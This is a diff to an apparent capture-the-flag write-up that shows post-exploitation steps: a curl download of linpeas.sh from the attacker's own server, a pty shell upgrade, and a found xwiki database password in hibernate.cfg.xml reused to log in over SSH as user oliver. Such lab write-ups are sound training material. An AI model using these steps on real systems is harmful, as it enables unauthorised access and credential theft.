@@ -72,7 +72,10 @@ This shell is not that beautiful so I just do `python3 -c 'import pty; pty.spawn
 I start by installing `linpeas.sh` on the remote host and run it. I installed `linpeas.sh` by exposing a `http.server` locally and then simply `curl -LO 10.10.16.16:8000/linpeas.sh`.
 While this outputs many things, I was not able to find anything directly here. Sad.
 
-Instead I noticed that within `/home` there is folder for username `oliver`. So, I tried finding a password. I had to do manual lookups and 
+Instead I noticed that within `/home` there is folder for username `oliver`. So, I tried finding a password. I had to do manual lookups and found a password for `xwiki` that looks interesting in file `/etc/xwiki/hibernate.cfg.xml`.
+![[Pasted image 20250811000901.png]]
+
+So, I try to login to `oliver` via `ssh` and success!
 
 
 
